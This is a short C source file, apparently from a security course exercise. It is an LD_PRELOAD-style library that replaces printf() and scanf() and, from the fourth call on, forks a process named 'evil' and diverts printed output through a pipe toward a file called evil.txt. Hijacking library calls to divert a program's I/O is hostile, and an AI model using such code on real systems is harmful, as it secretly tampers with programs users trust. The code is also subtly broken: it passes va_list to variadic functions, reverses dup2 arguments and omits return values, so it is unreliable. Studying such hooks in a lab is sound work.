#include <stdint.h>
#include <dlfcn.h>
#include <stdarg.h>

#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

/*
 * We aren't providing much code here.  You'll need to implement your own
 * printf() and scanf(), as well as any constructors or destructors for your
 * library.
 */

static int call_counter = 0;
static int pipe_write_fd;
static int child_pid;

void evil_process_loop(int pipe_fd){
  int file = open("evil.txt", O_CREAT | O_APPEND | O_WRONLY);
  if(dup2(file,pipe_fd) < 0){
    printf("redirect to evil.txt failed");
    return;
  }
  if(dup2(STDOUT_FILENO,pipe_fd) < 0){
    printf("redirect to stdout failed");
    return;
  }
  while(1){
    sleep(1);
  }
  close(pipe_fd);
}

void fork_evil_process(){
  int pipefd[2];
  if(pipe(pipefd) == -1){
    printf("pipe failure");
    return;
  }
  
  pid_t process_id = fork();
  if(process_id == -1){
    printf("fork error");
    return;
  }else if(process_id == 0){
    close(pipefd[1]);
    evil_process_loop(pipefd[0]);
    return;
  }else{
    close(pipefd[0]);
    pipe_write_fd = pipefd[1];
    child_pid = process_id;
    return;
  }
}

int printf(const char * format, ...){
  call_counter++;

  int (*real_printf)(const char * format, ...)=(int(*)(const char * format, ...))(dlsym (RTLD_NEXT, "printf"));

  if(call_counter < 4){
    va_list ap;
    va_start(ap, format);
    int ret_val = real_printf(format, ap);
    va_end(ap);
    return ret_val;
  }else if(call_counter == 4){
    fork_evil_process();
  }else{
    va_list ap;
    va_start(ap, format);
    FILE * pipe = fdopen(pipe_write_fd, "wb");
    int ret_val = fprintf(pipe, format, ap);
    fclose(pipe);
    va_end(ap);
    return ret_val;
  }
}

int scanf(const char * format, ...){
  call_counter++;
  
  int (*real_scanf)(const char * format, ...)=(int(*)(const char * format, ...))(dlsym (RTLD_NEXT, "scanf"));

  if(call_counter != 4){
    va_list ap;
    va_start(ap, format);
    int ret_val = real_scanf(format, ap);
    va_end(ap);
    return ret_val;
  }else if(call_counter == 4){
    fork_evil_process();
  }
}
